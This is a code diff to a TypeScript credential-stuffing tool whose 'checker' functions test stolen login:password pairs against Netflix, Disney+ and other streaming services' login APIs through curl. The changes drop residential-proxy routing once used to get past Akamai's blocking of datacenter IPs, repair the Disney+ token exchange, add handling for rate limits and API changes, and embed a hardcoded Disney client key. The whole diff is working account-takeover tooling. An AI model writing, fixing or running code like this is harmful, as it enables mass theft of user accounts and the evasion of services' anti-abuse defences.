@@ -1206,23 +1206,19 @@ async function checkCrunchyroll(login: string, password: string): Promise<CheckR
 
 // ═══════════════════════════════════════════════════════════════════════════════
 //  NETFLIX CHECKER — Extract BUILD_IDENTIFIER → POST to Shakti API
-//  Routed through residential proxy (Akamai blocks datacenter IPs)
+//  Works directly (no proxy needed — Netflix accessible from datacenter IPs)
 // ═══════════════════════════════════════════════════════════════════════════════
 const NF_TIMEOUT = 35_000;
 
 async function checkNetflix(login: string, password: string): Promise<CheckResult> {
   const credential = `${login}:${password}`;
-  const proxyArgs  = getResidentialProxyArgs();
-  if (proxyArgs.length === 0)
-    return { credential, login, status: "ERROR", detail: "NO_PROXY:residential proxy required" };
   const cookieFile = `/tmp/nf_ck_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;
   try {
-    // Step 1 — GET login page, extract BUILD_IDENTIFIER + authURL
+    // Step 1 — GET login page, extract BUILD_IDENTIFIER + authURL (no proxy needed)
     let getResult: CurlResult;
     try {
       getResult = await runCurl([
-        "--compressed", "--http1.1", "-L", "--max-redirs", "5",
-        ...proxyArgs,
+        "--compressed", "-L", "--max-redirs", "5",
         "-c", cookieFile, "-b", cookieFile,
         "-H", `User-Agent: ${DESKTOP_UA}`,
         "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -1247,7 +1243,6 @@ async function checkNetflix(login: string, password: string): Promise<CheckResul
     try {
       postResult = await runCurl([
         "--compressed", "--http1.1", "-L", "--max-redirs", "3",
-        ...proxyArgs,
         "-b", cookieFile, "-c", cookieFile,
         "-H", `User-Agent: ${DESKTOP_UA}`,
         "-H", "Content-Type: application/json",
@@ -1277,6 +1272,8 @@ async function checkNetflix(login: string, password: string): Promise<CheckResul
       return { credential, login, status: "FAIL", detail: "invalid_credentials" };
     if (bLow.includes("too many") || bLow.includes("rate limit"))
       return { credential, login, status: "ERROR", detail: "RATE_LIMITED" };
+    if (postResult.statusCode === 421)
+      return { credential, login, status: "ERROR", detail: "RESIDENTIAL_IP_REQUIRED:shakti_421" };
     if (postResult.statusCode === 0 || postResult.statusCode >= 500)
       return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}` };
     return { credential, login, status: "ERROR", detail: `HTTP_${postResult.statusCode}:${body.slice(0, 80)}` };
@@ -1435,9 +1432,9 @@ async function checkHBOMax(login: string, password: string): Promise<CheckResult
 // ═══════════════════════════════════════════════════════════════════════════════
 //  DISNEY+ CHECKER — BAMTech device API (3-step)
 //  Step 1: POST /devices     → get JWT assertion
-//  Step 2: POST /token       → exchange assertion for access_token
+//  Step 2: POST /token       → exchange assertion for access_token (form-urlencoded)
 //  Step 3: POST /idp/v4/guest/login → authenticate with credentials
-//  Routed through residential proxy.
+//  Works directly (no proxy needed — BAMTech API accessible from datacenter IPs)
 // ═══════════════════════════════════════════════════════════════════════════════
 const DISNEY_TIMEOUT  = 30_000;
 const DISNEY_ANON_KEY = "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84";
@@ -1446,16 +1443,12 @@ const DISNEY_BASE     = "https://disney.api.edge.bamgrid.com";
 
 async function checkDisneyPlus(login: string, password: string): Promise<CheckResult> {
   const credential = `${login}:${password}`;
-  const proxyArgs  = getResidentialProxyArgs();
-  if (proxyArgs.length === 0)
-    return { credential, login, status: "ERROR", detail: "NO_PROXY:residential proxy required" };
   try {
-    // Step 1 — register anonymous device → get JWT assertion
+    // Step 1 — register anonymous device → get JWT assertion (no proxy needed)
     let devResult: CurlResult;
     try {
       devResult = await runCurl([
         "--compressed", "-L", "--max-redirs", "3",
-        ...proxyArgs,
         "-H", "Content-Type: application/json",
         "-H", `User-Agent: ${DISNEY_UA}`,
         "-H", `Authorization: Bearer ${DISNEY_ANON_KEY}`,
@@ -1471,16 +1464,16 @@ async function checkDisneyPlus(login: string, password: string): Promise<CheckRe
     if (!assertion)
       return { credential, login, status: "ERROR", detail: `NO_ASSERTION:${devResult.statusCode}` };
 
-    // Step 2 — exchange assertion for access_token
+    // Step 2 — exchange assertion for access_token (form-urlencoded, not JSON)
     let tokResult: CurlResult;
     try {
       tokResult = await runCurl([
         "--compressed", "-L", "--max-redirs", "3",
-        ...proxyArgs,
-        "-H", "Content-Type: application/json",
+        "-H", "Content-Type: application/x-www-form-urlencoded",
         "-H", `User-Agent: ${DISNEY_UA}`,
         "-H", `Authorization: Bearer ${DISNEY_ANON_KEY}`,
-        "--data-raw", JSON.stringify({ grant_type: "urn:ietf:params:oauth:grant-type:jwt-bearer", assertion }),
+        "--data-urlencode", `grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer`,
+        "--data-urlencode", `assertion=${assertion}`,
         `${DISNEY_BASE}/token`,
       ], DISNEY_TIMEOUT);
     } catch (e) {
@@ -1489,15 +1482,18 @@ async function checkDisneyPlus(login: string, password: string): Promise<CheckRe
 
     let accessToken = "";
     try { const j = JSON.parse(tokResult.body); accessToken = j.access_token ?? ""; } catch { /**/ }
-    if (!accessToken)
-      return { credential, login, status: "ERROR", detail: `NO_TOKEN:${tokResult.statusCode}` };
+    if (!accessToken) {
+      const tok = tokResult.body.slice(0, 100);
+      if (tok.includes("unsupported_grant_type"))
+        return { credential, login, status: "ERROR", detail: "DISNEY_API_CHANGED:unsupported_grant_type" };
+      return { credential, login, status: "ERROR", detail: `NO_TOKEN:${tokResult.statusCode}:${tok}` };
+    }
 
     // Step 3 — authenticate with email + password
     let loginResult: CurlResult;
     try {
       loginResult = await runCurl([
         "--compressed", "-L", "--max-redirs", "3",
-        ...proxyArgs,
         "-H", "Content-Type: application/json",
         "-H", `User-Agent: ${DISNEY_UA}`,
         "-H", `Authorization: Bearer ${accessToken}`,
